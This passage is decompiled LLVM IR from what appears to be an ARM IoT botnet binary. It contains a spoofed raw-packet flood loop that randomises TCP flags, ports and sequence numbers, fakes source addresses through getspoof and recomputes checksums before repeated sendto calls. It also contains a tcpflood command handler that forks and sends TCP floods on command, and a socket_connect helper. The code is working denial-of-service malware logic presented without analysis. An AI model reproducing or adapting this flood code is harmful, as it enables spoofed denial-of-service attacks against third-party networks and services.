  %v3_13314 = load i8, i8* %v2_132f0, align 1
  %v1_13324 = or i8 %v3_13314, 32
  store i8 %v1_13324, i8* %v2_132f0, align 1
  br label %dec_label_pc_13508

dec_label_pc_13338:                               ; preds = %dec_label_pc_132d0
  store i32 %v3_12f1c, i32* @r0, align 4
  %v2_13344 = call i32 @__GI_strtok(i32 %v3_12f1c, i32 ptrtoint (i32* @global_var_37bdc.466 to i32))
  %v2_1350017 = icmp eq i32 %v2_13344, 0
  br i1 %v2_1350017, label %dec_label_pc_13508, label %dec_label_pc_13354.lr.ph

dec_label_pc_13354.lr.ph:                         ; preds = %dec_label_pc_13338
  %v1_13374 = add i32 %v3_13098, 33
  %v2_13374 = inttoptr i32 %v1_13374 to i8*
  br label %dec_label_pc_13354

dec_label_pc_13354:                               ; preds = %dec_label_pc_13354.lr.ph, %dec_label_pc_134e8
  %storemerge1218 = phi i32 [ %v2_13344, %dec_label_pc_13354.lr.ph ], [ %v2_134f0, %dec_label_pc_134e8 ]
  store i32 ptrtoint ([4 x i8]* @global_var_37be0.468 to i32), i32* @r1, align 4
  %v3_13360 = inttoptr i32 %storemerge1218 to i8*
  %v4_13360 = call i32 @__GI_strcoll(i8* %v3_13360, i32 ptrtoint ([4 x i8]* @global_var_37be0.468 to i32))
  %v2_13368 = icmp eq i32 %v4_13360, 0
  br i1 %v2_13368, label %dec_label_pc_13370, label %dec_label_pc_13398

dec_label_pc_13370:                               ; preds = %dec_label_pc_13354
  %v3_13374 = load i8, i8* %v2_13374, align 1
  %v4_1337c = zext i8 %v3_13374 to i32
  %v1_13384 = or i32 %v4_1337c, 2
  store i32 %v1_13384, i32* %r2.global-to-local, align 4
  %v1_13390 = trunc i32 %v1_13384 to i8
  store i8 %v1_13390, i8* %v2_13374, align 1
  br label %dec_label_pc_134e8

dec_label_pc_13398:                               ; preds = %dec_label_pc_13354
  store i32 ptrtoint ([4 x i8]* @global_var_37be4.470 to i32), i32* @r1, align 4
  %v4_133a4 = call i32 @__GI_strcoll(i8* %v3_13360, i32 ptrtoint ([4 x i8]* @global_var_37be4.470 to i32))
  %v2_133ac = icmp eq i32 %v4_133a4, 0
  br i1 %v2_133ac, label %dec_label_pc_133b4, label %dec_label_pc_133dc

dec_label_pc_133b4:                               ; preds = %dec_label_pc_13398
  %v3_133b8 = load i8, i8* %v2_13374, align 1
  %v4_133c0 = zext i8 %v3_133b8 to i32
  %v1_133c8 = or i32 %v4_133c0, 4
  store i32 %v1_133c8, i32* %r2.global-to-local, align 4
  %v1_133d4 = trunc i32 %v1_133c8 to i8
  store i8 %v1_133d4, i8* %v2_13374, align 1
  br label %dec_label_pc_134e8

dec_label_pc_133dc:                               ; preds = %dec_label_pc_13398
  store i32 ptrtoint ([4 x i8]* @global_var_37be8.472 to i32), i32* @r1, align 4
  %v4_133e8 = call i32 @__GI_strcoll(i8* %v3_13360, i32 ptrtoint ([4 x i8]* @global_var_37be8.472 to i32))
  %v2_133f0 = icmp eq i32 %v4_133e8, 0
  br i1 %v2_133f0, label %dec_label_pc_133f8, label %dec_label_pc_13420

dec_label_pc_133f8:                               ; preds = %dec_label_pc_133dc
  %v3_133fc = load i8, i8* %v2_13374, align 1
  %v4_13404 = zext i8 %v3_133fc to i32
  %v1_1340c = or i32 %v4_13404, 1
  store i32 %v1_1340c, i32* %r2.global-to-local, align 4
  %v1_13418 = trunc i32 %v1_1340c to i8
  store i8 %v1_13418, i8* %v2_13374, align 1
  br label %dec_label_pc_134e8

dec_label_pc_13420:                               ; preds = %dec_label_pc_133dc
  store i32 ptrtoint ([4 x i8]* @global_var_37bec.474 to i32), i32* @r1, align 4
  %v4_1342c = call i32 @__GI_strcoll(i8* %v3_13360, i32 ptrtoint ([4 x i8]* @global_var_37bec.474 to i32))
  %v2_13434 = icmp eq i32 %v4_1342c, 0
  br i1 %v2_13434, label %dec_label_pc_1343c, label %dec_label_pc_13464

dec_label_pc_1343c:                               ; preds = %dec_label_pc_13420
  %v3_13440 = load i8, i8* %v2_13374, align 1
  %v4_13448 = zext i8 %v3_13440 to i32
  %v1_13450 = or i32 %v4_13448, 16
  store i32 %v1_13450, i32* %r2.global-to-local, align 4
  %v1_1345c = trunc i32 %v1_13450 to i8
  store i8 %v1_1345c, i8* %v2_13374, align 1
  br label %dec_label_pc_134e8

dec_label_pc_13464:                               ; preds = %dec_label_pc_13420
  store i32 ptrtoint ([4 x i8]* @global_var_37bf0.476 to i32), i32* @r1, align 4
  %v4_13470 = call i32 @__GI_strcoll(i8* %v3_13360, i32 ptrtoint ([4 x i8]* @global_var_37bf0.476 to i32))
  %v2_13478 = icmp eq i32 %v4_13470, 0
  br i1 %v2_13478, label %dec_label_pc_13480, label %dec_label_pc_134a8

dec_label_pc_13480:                               ; preds = %dec_label_pc_13464
  %v3_13484 = load i8, i8* %v2_13374, align 1
  %v4_1348c = zext i8 %v3_13484 to i32
  %v1_13494 = or i32 %v4_1348c, 8
  store i32 %v1_13494, i32* %r2.global-to-local, align 4
  %v1_134a0 = trunc i32 %v1_13494 to i8
  store i8 %v1_134a0, i8* %v2_13374, align 1
  br label %dec_label_pc_134e8

dec_label_pc_134a8:                               ; preds = %dec_label_pc_13464
  store i32 ptrtoint ([4 x i8]* @global_var_37bf4.478 to i32), i32* @r1, align 4
  %v4_134b4 = call i32 @__GI_strcoll(i8* %v3_13360, i32 ptrtoint ([4 x i8]* @global_var_37bf4.478 to i32))
  %v2_134bc = icmp eq i32 %v4_134b4, 0
  br i1 %v2_134bc, label %dec_label_pc_134c4, label %dec_label_pc_134e8

dec_label_pc_134c4:                               ; preds = %dec_label_pc_134a8
  %v3_134c8 = load i8, i8* %v2_13374, align 1
  %v4_134d0 = zext i8 %v3_134c8 to i32
  %v1_134d8 = or i32 %v4_134d0, 32
  store i32 %v1_134d8, i32* %r2.global-to-local, align 4
  %v1_134e4 = trunc i32 %v1_134d8 to i8
  store i8 %v1_134e4, i8* %v2_13374, align 1
  br label %dec_label_pc_134e8

dec_label_pc_134e8:                               ; preds = %dec_label_pc_134a8, %dec_label_pc_13480, %dec_label_pc_1343c, %dec_label_pc_133f8, %dec_label_pc_133b4, %dec_label_pc_13370, %dec_label_pc_134c4
  store i32 0, i32* @r0, align 4
  %v2_134f0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_37bdc.466 to i32))
  %v2_13500 = icmp eq i32 %v2_134f0, 0
  br i1 %v2_13500, label %dec_label_pc_13508, label %dec_label_pc_13354

dec_label_pc_13508:                               ; preds = %dec_label_pc_134e8, %dec_label_pc_13338, %dec_label_pc_132ec, %dec_label_pc_13260, %dec_label_pc_13168
  %v3_13510 = add i32 %v3_13098, 34
  %v4_13510 = inttoptr i32 %v3_13510 to i16*
  store i16 2048, i16* %v4_13510, align 2
  %v3_1351c = add i32 %v3_13098, 36
  %v4_1351c = inttoptr i32 %v3_1351c to i16*
  store i16 0, i16* %v4_1351c, align 4
  store i32 %v1_130b8, i32* %r2.global-to-local, align 4
  %v3_13528 = add i32 %v3_13098, 38
  %v4_13528 = inttoptr i32 %v3_13528 to i16*
  store i16 0, i16* %v4_13528, align 2
  br i1 %v2_12f5c, label %dec_label_pc_13538, label %dec_label_pc_13550

dec_label_pc_13538:                               ; preds = %dec_label_pc_13508
  %v0_13538 = call i32 @rand_cmwc()
  %extract.t = trunc i32 %v0_13538 to i16
  br label %dec_label_pc_1356c

dec_label_pc_13550:                               ; preds = %dec_label_pc_13508
  %v3_13558 = urem i32 %v3_12f04, 65536
  %v1_13560 = call i32 @__GI_htons(i32 %v3_13558)
  %extract.t82 = trunc i32 %v1_13560 to i16
  br label %dec_label_pc_1356c

dec_label_pc_1356c:                               ; preds = %dec_label_pc_13538, %dec_label_pc_13550
  %v0_13538.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_13538 ], [ %extract.t82, %dec_label_pc_13550 ]
  %v3_13574 = add i32 %v3_13098, 22
  %v4_13574 = inttoptr i32 %v3_13574 to i16*
  store i16 %v0_13538.sink.off0, i16* %v4_13574, align 2
  store i32 %v1_130b8, i32* %r2.global-to-local, align 4
  %v2_13588 = inttoptr i32 %v3_13098 to i16*
  %v3_13588 = call i32 @csum(i16* %v2_13588, i32 %v1_130b8)
  %v1_13598 = trunc i32 %v3_13588 to i16
  store i16 %v1_13598, i16* %v4_1351c, align 4
  store i32 %v3_13098, i32* %r2.global-to-local, align 4
  %v1_135a8 = or i32 %v3_13098, 2
  %v2_135a8 = inttoptr i32 %v1_135a8 to i16*
  %v3_135a8 = load i16, i16* %v2_135a8, align 2
  %v4_135a8 = zext i16 %v3_135a8 to i32
  %v3_135b4 = call i32 @csum(i16* %v2_13588, i32 %v4_135a8)
  %sext3 = mul i32 %v3_135b4, 65536
  %v1_135b8 = sdiv i32 %sext3, 65536
  store i32 %v1_135b8, i32* %r2.global-to-local, align 4
  %v1_135c4 = trunc i32 %v1_135b8 to i16
  %v3_135c4 = add i32 %v3_13098, 10
  %v4_135c4 = inttoptr i32 %v3_135c4 to i16*
  store i16 %v1_135c4, i16* %v4_135c4, align 2
  %v2_135cc = call i32 @__GI_time(i32* null)
  %v2_135d8 = add i32 %v2_135cc, %v3_12f10
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_135ec = ptrtoint i32* %stack_var_-100 to i32
  %v2_1361c = add i32 %v3_13098, 12
  %v3_1361c = inttoptr i32 %v2_1361c to i32*
  %v3_13634 = or i32 %v3_13098, 4
  %v4_13634 = inttoptr i32 %v3_13634 to i16*
  br label %dec_label_pc_135e8

dec_label_pc_135e8:                               ; preds = %dec_label_pc_136f0, %dec_label_pc_136e4, %dec_label_pc_1356c
  %stack_var_-112.0 = phi i32 [ 0, %dec_label_pc_1356c ], [ 0, %dec_label_pc_136e4 ], [ %v1_136f4, %dec_label_pc_136f0 ]
  store i32 %v3_13098, i32* %r2.global-to-local, align 4
  %v1_135f0 = load i32, i32* @sp, align 4
  %v2_135f0 = inttoptr i32 %v1_135f0 to i32*
  store i32 %v2_135ec, i32* %v2_135f0, align 4
  %v1_135f8 = load i32, i32* @sp, align 4
  %v2_135f8 = add i32 %v1_135f8, 4
  %v3_135f8 = inttoptr i32 %v2_135f8 to i32*
  store i32 16, i32* %v3_135f8, align 4
  %v0_13600 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_13068, i32* %r2.global-to-local, align 4
  %v6_1360c = call i32 @sendto(i32 %v3_12fe0, i32 %v0_13600, i32 %v1_13068, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_13610 = call i32 @getspoof()
  store i32 %v0_13610, i32* %r2.global-to-local, align 4
  store i32 %v0_13610, i32* %v3_1361c, align 4
  %v0_13620 = call i32 @rand_cmwc()
  %v3_1362c = urem i32 %v0_13620, 65536
  store i32 %v3_1362c, i32* %r2.global-to-local, align 4
  %v1_13634 = trunc i32 %v0_13620 to i16
  store i16 %v1_13634, i16* %v4_13634, align 4
  %v0_13638 = call i32 @rand_cmwc()
  store i32 %v0_13638, i32* %r2.global-to-local, align 4
  store i32 %v0_13638, i32* %v3_13118, align 8
  %v0_13648 = call i32 @rand_cmwc()
  %v1_1365c = trunc i32 %v0_13648 to i16
  store i16 %v1_1365c, i16* %v5_130bc, align 4
  store i16 0, i16* %v4_1351c, align 4
  store i32 %v1_130b8, i32* %r2.global-to-local, align 4
  %v3_1367c = call i32 @csum(i16* %v2_13588, i32 %v1_130b8)
  %v1_1368c = trunc i32 %v3_1367c to i16
  store i16 %v1_1368c, i16* %v4_1351c, align 4
  store i32 %v3_13098, i32* %r2.global-to-local, align 4
  %v3_1369c = load i16, i16* %v2_135a8, align 2
  %v4_1369c = zext i16 %v3_1369c to i32
  %v3_136a8 = call i32 @csum(i16* %v2_13588, i32 %v4_1369c)
  %sext5 = mul i32 %v3_136a8, 65536
  %v1_136ac = sdiv i32 %sext5, 65536
  store i32 %v1_136ac, i32* %r2.global-to-local, align 4
  %v1_136b8 = trunc i32 %v1_136ac to i16
  store i16 %v1_136b8, i16* %v4_135c4, align 2
  %v9_136c4 = icmp eq i32 %stack_var_-112.0, %v3_12f34
  br i1 %v9_136c4, label %dec_label_pc_136cc, label %dec_label_pc_136f0

dec_label_pc_136cc:                               ; preds = %dec_label_pc_135e8
  %v2_136d0 = call i32 @__GI_time(i32* null)
  store i32 %v2_136d0, i32* %r2.global-to-local, align 4
  %v8_136e0 = icmp sgt i32 %v2_136d0, %v2_135d8
  br i1 %v8_136e0, label %dec_label_pc_13700, label %dec_label_pc_136e4

dec_label_pc_136e4:                               ; preds = %dec_label_pc_136cc
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_135e8

dec_label_pc_136f0:                               ; preds = %dec_label_pc_135e8
  %v1_136f4 = add i32 %stack_var_-112.0, 1
  br label %dec_label_pc_135e8

dec_label_pc_13700:                               ; preds = %dec_label_pc_136cc, %dec_label_pc_12ffc, %dec_label_pc_12fbc, %dec_label_pc_12f98, %entry
  %v1_1370c = phi i32 [ %v5_13020, %dec_label_pc_12ffc ], [ 0, %dec_label_pc_12fbc ], [ %v3_12fa8, %dec_label_pc_12f98 ], [ %v0_12ed8, %entry ], [ %v2_136d0, %dec_label_pc_136cc ]
  store i32 %v3_12ec0, i32* @r4, align 4
  store i32 %v6_12ec0, i32* @fp, align 4
  ret i32 %v1_1370c

; uselistorder directives
  uselistorder i32 %v1_136ac, { 1, 0 }
  uselistorder i32 %v0_13620, { 1, 0 }
  uselistorder i32 %v1_135b8, { 1, 0 }
  uselistorder i16* %v2_13588, { 0, 2, 1, 3 }
  uselistorder i8* %v2_13374, { 0, 6, 1, 7, 2, 8, 3, 9, 4, 10, 5, 11 }
  uselistorder i8* %v2_132f0, { 1, 2, 0, 3 }
  uselistorder i8* %v2_13264, { 2, 3, 1, 4, 0, 5 }
  uselistorder i8* %v2_1316c, { 5, 6, 4, 7, 3, 8, 2, 9, 1, 10, 0, 11 }
  uselistorder i32 %v0_130f4, { 1, 0 }
  uselistorder i32 %v1_130b8, { 11, 12, 13, 14, 15, 9, 10, 6, 7, 8, 0, 1, 2, 3, 4, 5, 16, 17 }
  uselistorder i32 %v3_13098, { 8, 6, 18, 7, 5, 17, 4, 3, 16, 15, 14, 13, 12, 19, 20, 21, 11, 10, 9, 2, 1, 0 }
  uselistorder i32 %v1_13068, { 1, 0 }
  uselistorder i32 %v3_12f28, { 0, 2, 1 }
  uselistorder i32 %v3_12f1c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-100, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendto, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_37bf4.478 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_37bf0.476 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_37bec.474 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_37be8.472 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_37be4.470 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_37be0.468 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_37bc4.460 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_37bbc.458 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_37bb8.456 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @__GI_htonl, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @getspoof, { 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1356c, { 1, 0 }
  uselistorder label %dec_label_pc_134e8, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_13354, { 1, 0 }
  uselistorder label %dec_label_pc_13064, { 1, 0 }
  uselistorder label %dec_label_pc_12f98, { 1, 0 }
}

define i32 @tcpflood(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 79684, i32* %stack_var_-4, align 4
  %v2_13740 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_13740, i32* @fp, align 4
  %v1_13764 = call i32 @mfork(i32 %arg2)
  %v2_1376c = icmp eq i32 %v1_13764, 0
  br i1 %v2_1376c, label %dec_label_pc_13774, label %dec_label_pc_13b38

dec_label_pc_13774:                               ; preds = %entry
  %v7_1377c = icmp slt i32 %arg3, 7
  br i1 %v7_1377c, label %dec_label_pc_13818, label %dec_label_pc_13780

dec_label_pc_13780:                               ; preds = %dec_label_pc_13774
  %v1_13784 = add i32 %arg4, 12
  %v1_13788 = inttoptr i32 %v1_13784 to i32*
  %v2_13788 = load i32, i32* %v1_13788, align 4
  store i32 %v2_13788, i32* @r0, align 4
  %v1_13790 = call i32 @atol(i32 %v2_13788)
  %v7_13798 = icmp eq i32 %v1_13790, -1
  br i1 %v7_13798, label %dec_label_pc_13818, label %dec_label_pc_137a0

dec_label_pc_137a0:                               ; preds = %dec_label_pc_13780
  %v1_137a4 = add i32 %arg4, 8
  %v1_137a8 = inttoptr i32 %v1_137a4 to i32*
  %v2_137a8 = load i32, i32* %v1_137a8, align 4
  store i32 %v2_137a8, i32* @r0, align 4
  %v1_137b0 = call i32 @atol(i32 %v2_137a8)
  %v7_137b8 = icmp eq i32 %v1_137b0, -1
  br i1 %v7_137b8, label %dec_label_pc_13818, label %dec_label_pc_137cc

dec_label_pc_137cc:                               ; preds = %dec_label_pc_137a0
  %v1_137d0 = add i32 %arg4, 20
  %v1_137d4 = inttoptr i32 %v1_137d0 to i32*
  %v2_137d4 = load i32, i32* %v1_137d4, align 4
  store i32 %v2_137d4, i32* @r0, align 4
  %v1_137dc = call i32 @atol(i32 %v2_137d4)
  %v1_137e4 = icmp slt i32 %v1_137dc, 0
  br i1 %v1_137e4, label %dec_label_pc_13818, label %dec_label_pc_137ec

dec_label_pc_137ec:                               ; preds = %dec_label_pc_137cc
  %v7_137f0 = icmp eq i32 %arg3, 7
  br i1 %v7_137f0, label %dec_label_pc_137f8, label %dec_label_pc_138b4

dec_label_pc_137f8:                               ; preds = %dec_label_pc_137ec
  %v1_137fc = add i32 %arg4, 24
  %v1_13800 = inttoptr i32 %v1_137fc to i32*
  %v2_13800 = load i32, i32* %v1_13800, align 4
  store i32 %v2_13800, i32* @r0, align 4
  %v1_13808 = call i32 @atol(i32 %v2_13800)
  %v5_13814 = icmp sgt i32 %v1_13808, 0
  br i1 %v5_13814, label %dec_label_pc_138b4, label %dec_label_pc_13818

dec_label_pc_13818:                               ; preds = %dec_label_pc_137f8, %dec_label_pc_137cc, %dec_label_pc_137a0, %dec_label_pc_13780, %dec_label_pc_13774
  store i32 %arg2, i32* @r2, align 4
  %v3_13824 = call i32 @Send(i32 %arg1, i32 ptrtoint ([92 x i8]* @global_var_383f0.602 to i32))
  br label %dec_label_pc_13b38

dec_label_pc_138b4:                               ; preds = %dec_label_pc_137ec, %dec_label_pc_137f8
  %v1_13830 = add i32 %arg4, 4
  %v1_13834 = inttoptr i32 %v1_13830 to i32*
  %v2_13834 = load i32, i32* %v1_13834, align 4
  %v2_13844 = load i32, i32* %v1_137a8, align 4
  store i32 %v2_13844, i32* @r0, align 4
  %v1_1384c = call i32 @atol(i32 %v2_13844)
  %v2_13860 = load i32, i32* %v1_13788, align 4
  store i32 %v2_13860, i32* @r0, align 4
  %v1_13868 = call i32 @atol(i32 %v2_13860)
  %v1_13878 = add i32 %arg4, 16
  %v1_1387c = inttoptr i32 %v1_13878 to i32*
  %v2_1387c = load i32, i32* %v1_1387c, align 4
  %v2_13898 = load i32, i32* %v1_137d4, align 4
  store i32 %v2_13898, i32* @r0, align 4
  %v1_138a0 = call i32 @atol(i32 %v2_13898)
  br i1 %v7_137f0, label %dec_label_pc_138c8, label %dec_label_pc_138e4

dec_label_pc_138c8:                               ; preds = %dec_label_pc_138b4
  %v1_138cc = add i32 %arg4, 24
  %v1_138d0 = inttoptr i32 %v1_138cc to i32*
  %v2_138d0 = load i32, i32* %v1_138d0, align 4
  store i32 %v2_138d0, i32* @r0, align 4
  %v1_138d8 = call i32 @atol(i32 %v2_138d0)
  br label %dec_label_pc_138ec

dec_label_pc_138e4:                               ; preds = %dec_label_pc_138b4
  br label %dec_label_pc_138ec

dec_label_pc_138ec:                               ; preds = %dec_label_pc_138c8, %dec_label_pc_138e4
  %storemerge1 = phi i32 [ 10, %dec_label_pc_138e4 ], [ %v1_138d8, %dec_label_pc_138c8 ]
  %v1_138f8 = add i32 %arg4, 28
  %v1_138fc = inttoptr i32 %v1_138f8 to i32*
  %v2_138fc = load i32, i32* %v1_138fc, align 4
  store i32 %v2_138fc, i32* @r0, align 4
  %v1_13904 = call i32 @atol(i32 %v2_138fc)
  %v2_13928 = load i32, i32* %v1_13834, align 4
  store i32 %v2_13928, i32* @r0, align 4
  %v1_13930 = call i32 @inet_addr(i32 %v2_13928)
  %v2_13948 = mul i32 %v1_13904, 28
  %v1_13950 = add i32 %v2_13948, 14
  %v3_13954 = and i32 %v1_13950, -8
  %v1_1395c = load i32, i32* @sp, align 4
  %v2_1395c = sub i32 %v1_1395c, %v3_13954
  %v1_1396c = add i32 %v2_1395c, 23
  %v3_13970 = and i32 %v1_1396c, -8
  store i32 %v2_13834, i32* @r0, align 4
  %v2_13990 = call i32 @__GI_strtok(i32 %v2_13834, i32 ptrtoint (i32* @global_var_37bdc.466 to i32))
  %v1_13ae8 = add i32 %v1_13904, -1
  %v8_13af433 = icmp sgt i32 %v1_13ae8, 0
  br i1 %v8_13af433, label %dec_label_pc_139a8, label %dec_label_pc_13af8

dec_label_pc_139a8:                               ; preds = %dec_label_pc_138ec, %dec_label_pc_139a8
  %storemerge334 = phi i32 [ %v1_13adc, %dec_label_pc_139a8 ], [ 0, %dec_label_pc_138ec ]
  %v3_139b4 = mul i32 %storemerge334, 4
  %v2_139bc = mul i32 %storemerge334, 28
  %v2_139c0 = add i32 %v2_139bc, %v3_13970
  %v2_139c4 = inttoptr i32 %v2_139c0 to i32*
  store i32 %storemerge334, i32* %v2_139c4, align 4
  %v2_139e4 = add i32 %v2_139c0, 4
  %v2_139ec = inttoptr i32 %v2_139e4 to i32*
  store i32 %v1_1384c, i32* %v2_139ec, align 4
  %v2_13a0c = add i32 %v2_139c0, 8
  %v2_13a14 = inttoptr i32 %v2_13a0c to i32*
  store i32 %v1_13868, i32* %v2_13a14, align 4
  %v2_13a34 = add i32 %v2_139c0, 12
  %v2_13a3c = inttoptr i32 %v2_13a34 to i32*
  store i32 %v2_1387c, i32* %v2_13a3c, align 4
  %v2_13a5c = add i32 %v2_139c0, 16
  %v2_13a64 = inttoptr i32 %v2_13a5c to i32*
  store i32 %v1_138a0, i32* %v2_13a64, align 4
  %v2_13a84 = add i32 %v2_139c0, 20
  %v2_13a8c = inttoptr i32 %v2_13a84 to i32*
  store i32 %storemerge1, i32* %v2_13a8c, align 4
  %v2_13aac = add i32 %v2_139c0, 24
  %v2_13ab4 = inttoptr i32 %v2_13aac to i32*
  store i32 32, i32* %v2_13ab4, align 4
  %v4_13ad4 = call i32 @SendTCP(i32* %v2_139c4, i32 %v3_13970, i32 %v3_139b4)
  %v1_13adc = add nuw nsw i32 %storemerge334, 1
  %v8_13af4 = icmp sgt i32 %v1_13ae8, %v1_13adc
  br i1 %v8_13af4, label %dec_label_pc_139a8, label %dec_label_pc_13af8

dec_label_pc_13af8:                               ; preds = %dec_label_pc_139a8, %dec_label_pc_138ec
  %v1_13afc = load i32, i32* @sp, align 4
  %v2_13afc = inttoptr i32 %v1_13afc to i32*
  store i32 %v1_1384c, i32* %v2_13afc, align 4
  %v1_13b04 = load i32, i32* @sp, align 4
  %v2_13b04 = add i32 %v1_13b04, 4
  %v3_13b04 = inttoptr i32 %v2_13b04 to i32*
  store i32 %v2_1387c, i32* %v3_13b04, align 4
  %v1_13b0c = load i32, i32* @sp, align 4
  %v2_13b0c = add i32 %v1_13b0c, 8
  %v3_13b0c = inttoptr i32 %v2_13b0c to i32*
  store i32 %v1_13904, i32* %v3_13b0c, align 4
  store i32 %arg2, i32* @r2, align 4
  %v3_13b20 = call i32 @Send(i32 %arg1, i32 ptrtoint ([54 x i8]* @global_var_3844c.605 to i32))
  %v1_13b2c = call i32 @sleep(i32 %v1_13868)
  %v1_13b34 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_13b38

dec_label_pc_13b38:                               ; preds = %entry, %dec_label_pc_13818, %dec_label_pc_13af8
  %v1_13b44 = phi i32 [ %v1_13764, %entry ], [ %v3_13824, %dec_label_pc_13818 ], [ %v1_13b34, %dec_label_pc_13af8 ]
  ret i32 %v1_13b44

; uselistorder directives
  uselistorder i32 %v1_13adc, { 1, 0 }
  uselistorder i32 %storemerge334, { 2, 3, 1, 0 }
  uselistorder i32 %v1_13ae8, { 1, 0 }
  uselistorder i32 %v3_13970, { 1, 0 }
  uselistorder i32 %v2_13834, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 2, 3, 4, 5, 0, 6, 7 }
  uselistorder label %dec_label_pc_13b38, { 2, 1, 0 }
  uselistorder label %dec_label_pc_139a8, { 1, 0 }
  uselistorder label %dec_label_pc_138ec, { 1, 0 }
  uselistorder label %dec_label_pc_138b4, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_13b58 = load i32, i32* @fp, align 4
  store i32 80736, i32* %stack_var_-4, align 4
  %v2_13b5c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_13b5c, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  store i32 %arg1, i32* @r0, align 4
  %v1_13b7c = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_13b8c = icmp eq i32 %v1_13b7c, 0
  br i1 %v2_13b8c, label %dec_label_pc_13b94, label %dec_label_pc_13ba0

dec_label_pc_13b94:                               ; preds = %entry
  br label %dec_label_pc_13c6c

dec_label_pc_13ba0:                               ; preds = %entry
  %tmp = sext i16 %arg2 to i32
  %v1_13ba4 = add i32 %v1_13b7c, 16
  %v2_13ba4 = inttoptr i32 %v1_13ba4 to i32*
  %v3_13ba4 = load i32, i32* %v2_13ba4, align 4
  %v1_13ba8 = inttoptr i32 %v3_13ba4 to i32*
  %v2_13ba8 = load i32, i32* %v1_13ba8, align 4
  %v1_13bb0 = add i32 %v1_13b7c, 12
  %v2_13bb0 = inttoptr i32 %v1_13bb0 to i32*
  %v3_13bb0 = load i32, i32* %v2_13bb0, align 4
  store i32 %v3_13bb0, i32* @r2, align 4
  %v2_13bbc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13bbc, i32* @r3, align 4
  %v3_13bc8 = call i32 @bcopy(i32 %v2_13ba8, i32 %v2_13bbc, i32 %v3_13bb0)
  %v2_13bd4 = call i32 @__GI_htons(i32 %tmp)
  store i32 2, i32* %stack_var_-40, align 4
  %v3_13bf4 = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_13c00 = ptrtoint i32* %stack_var_-44 to i32
  %v5_13c1c = call i32 @__GI_setsockopt(i32 %v3_13bf4, i32 6, i32 1, i32 %v2_13c00, i32 4)
  %v3_13c24 = icmp eq i32 %v3_13bf4, -1
  br i1 %v3_13c24, label %dec_label_pc_13c2c, label %dec_label_pc_13c38

dec_label_pc_13c2c:                               ; preds = %dec_label_pc_13ba0
  br label %dec_label_pc_13c6c

dec_label_pc_13c38:                               ; preds = %dec_label_pc_13ba0
  %v2_13c38 = ptrtoint i32* %stack_var_-40 to i32
  %v3_13c48 = call i32 @connect(i32 %v3_13bf4, i32 %v2_13c38, i32 16)
  %v3_13c50 = icmp eq i32 %v3_13c48, -1
  br i1 %v3_13c50, label %dec_label_pc_13c58, label %dec_label_pc_13c64

dec_label_pc_13c58:                               ; preds = %dec_label_pc_13c38
  br label %dec_label_pc_13c6c

dec_label_pc_13c64:                               ; preds = %dec_label_pc_13c38
  br label %dec_label_pc_13c6c

dec_label_pc_13c6c:                               ; preds = %dec_label_pc_13c58, %dec_label_pc_13c2c, %dec_label_pc_13b94, %dec_label_pc_13c64
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_13b94 ], [ 0, %dec_label_pc_13c2c ], [ 0, %dec_label_pc_13c58 ], [ %v3_13bf4, %dec_label_pc_13c64 ]
  store i32 %v3_13b58, i32* @fp, align 4
  ret i32 %stack_var_-60.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
